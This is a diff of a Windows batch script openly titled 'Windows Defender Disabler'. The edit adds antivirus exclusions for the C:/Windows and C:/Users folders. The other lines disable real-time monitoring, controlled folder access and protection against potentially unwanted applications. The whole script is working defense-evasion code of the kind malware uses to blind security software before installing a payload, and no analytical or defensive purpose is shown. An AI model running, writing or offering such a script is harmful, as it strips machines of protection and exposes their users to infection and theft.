@@ -1,6 +1,7 @@
 @echo off
 title Windows Defender Disabler
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "C:"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "C:/Windows"
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "C:/Users"
 powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring"
 powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
